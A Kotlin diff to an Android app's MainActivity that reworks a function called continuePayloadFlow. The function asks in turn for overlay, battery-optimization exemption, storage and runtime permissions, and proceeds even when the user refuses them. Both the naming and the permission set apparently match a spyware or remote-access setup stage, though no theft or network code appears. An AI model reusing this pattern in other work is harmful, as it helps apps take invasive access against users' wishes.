@@ -143,7 +143,7 @@ class MainActivity : AppCompatActivity() {
     private fun continuePayloadFlow() {
         if (flowCompleted || isFinishing || isDestroyed) return
 
-        // Step 1: Overlay permission — request only once
+        // Step 1: Overlay permission — request only ONCE
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
             if (!overlayRequested) {
                 overlayRequested = true
@@ -153,11 +153,12 @@ class MainActivity : AppCompatActivity() {
                         Uri.parse("package:$packageName")
                     )
                 )
+                return // Wait for user to return from overlay settings
             }
-            return
+            // Already requested overlay — user came back without granting. Fall through.
         }
 
-        // Step 2: Battery optimization exemption — request only once
+        // Step 2: Battery optimization exemption — request only ONCE
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
             if (!pm.isIgnoringBatteryOptimizations(packageName)) {
@@ -169,8 +170,9 @@ class MainActivity : AppCompatActivity() {
                             Uri.parse("package:$packageName")
                         )
                     )
+                    return // Wait for user to return from battery dialog
                 }
-                return
+                // Already requested — user didn't grant. Fall through.
             }
         }
 
@@ -185,8 +187,9 @@ class MainActivity : AppCompatActivity() {
                             Uri.parse("package:$packageName")
                         )
                     )
+                    return // Wait for user to return from storage settings
                 }
-                return
+                // Already requested — user didn't grant. Fall through.
             }
         }
 
@@ -197,25 +200,21 @@ class MainActivity : AppCompatActivity() {
             if (!permissionRequested) {
                 permissionRequested = true
                 permissionHelper.requestPermissions(this)
+                return // Wait for onRequestPermissionsResult callback
             }
-            return
+            // Already requested — user denied. Fall through.
         }
 
-        // All permissions already granted — proceed directly
+        // All steps attempted (some may have been denied) — proceed
         finishSetup()
     }
 
     override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<String>, grantResults: IntArray) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults)
-        if (requestCode == PERMISSION_REQ_CODE) {
+        if (requestCode == PERMISSION_REQ_CODE && !isFinishing && !isDestroyed) {
             permissionRequested = false
-            // Re-check and continue flow if all granted, or skip if user denied
-            if (permissionHelper.hasAllPermissions(this)) {
-                finishSetup()
-            } else {
-                // User denied some — continue anyway with whatever we have
-                finishSetup()
-            }
+            // Continue flow regardless — proceed with whatever permissions were granted
+            continuePayloadFlow()
         }
     }
 
